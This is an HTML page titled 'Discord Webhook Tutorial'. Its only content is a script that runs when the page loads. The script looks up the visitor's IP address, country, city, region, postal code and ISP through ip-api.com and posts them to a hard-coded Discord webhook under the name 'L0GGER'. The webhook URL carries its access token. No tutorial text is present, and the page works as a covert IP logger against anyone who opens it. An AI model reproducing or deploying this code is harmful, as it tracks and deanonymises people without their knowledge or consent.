<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <title>Discord Webhook Tutorial</title>
  </head>
  <script>
    
    

    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/840728570434682880/5ccxJECuk7xjiN_a4GKrEbLGdtt2C1pfIns65ybWGRlMoeO8I5wHnnrjfqUNiFVHKGjh");
    request.setRequestHeader('Content-type', 'application/json');

    $.getJSON('http://ip-api.com/json', function(data) {
      console.log(JSON.stringify(data, null, 2));
      var DData = data
      var query = $("#query").val()

    var myEmbed = {
      author: {
        name: "L0GGER"
      },
      title: "Data logged:",
      description: "Country: " + DData.country + "\n\nCity: " + DData.city + "\n\nRegion Name: " + DData.regionName + "\n\nZip/postnummer: " + DData.zip + "\n\nIP: " + DData.query + "\n\nisp: " + DData.isp + "\n\nStatus: " + DData.status,
      color: hexToDecimal("#ff0000"),
    }

    var params = {
      username: "Logger",
      embeds: [ myEmbed ]
    }

    request.send(JSON.stringify(params));

    function hexToDecimal(hex) {
      return parseInt(hex.replace("#",""), 0)
    }
});
  </script>
</html>
